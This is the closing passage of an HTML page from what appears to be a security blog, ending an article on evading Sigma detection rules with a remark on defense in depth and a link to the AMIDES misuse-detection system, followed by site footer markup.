Basically, every security measure was turned off in order to not interfere with the attack and keep the focus on the Sigma rules.
As part of a defense-in-depth strategy, Sigma rules are still a valuable additional layer of security for the detection of malicious behavior.
Additionally, systems such as the <a href=https://github.com/fkie-cad/amides/ target=_blank rel=noopener>Adaptive Misuse Detection System (AMIDES)</a>
have been developed to detect exactly this kind of obfuscation and address some of the Sigma rules&rsquo; challenges.</p></article></div></div></div></main><footer class="flex flex-none justify-center"><section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300"><div class="flex flex-row"></div><div class=grow></div><div class="flex flex-row"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-9 0a9 9 0 1018 0A9 9 0 103 12"/><path d="M14 9.75a3.016 3.016.0 00-4.163.173 2.993 2.993.0 000 4.154A3.016 3.016.0 0014 14.25"/></svg>
</i>2022 - 2025 lolcads</div><div class="flex flex-row"><span class="ml-0 pl-0 md:ml-2 md:pl-2 border-l-0 md:border-l border-slate-300 dark:border-slate-400">Powered by <a href=https://gohugo.io target=_blank rel=noopener class=underline>Hugo</a> <span class=text-red-600>&#9829;</span> <a href=https://github.com/tomowang/hugo-theme-tailwind target=_blank rel=noopener class=underline>Tailwind</a></span></div></section></footer><script src=/main.min.c6372b6836971865bd94bfde974748aca8415824a2facab6ccd66a87384bfacb.js></script><div class="hidden top-1 right-1" id=code-copy><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667A2.667 2.667.0 019.667 7h8.666A2.667 2.667.0 0121 9.667v8.666A2.667 2.667.0 0118.333 21H9.667A2.667 2.667.0 017 18.333z"/><path d="M4.012 16.737A2.005 2.005.0 013 15V5c0-1.1.9-2 2-2h10c.75.0 1.158.385 1.5 1"/></svg></i></div><div class="hidden top-1 right-1" id=code-copy-done><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12l5 5L20 7"/></svg></i></div><script src=/code-copy.min.e7b2a74adef1ed474c335c8bd5e7832b2316b8842b0f9184d65286c5bd64f51a.js></script></body></html>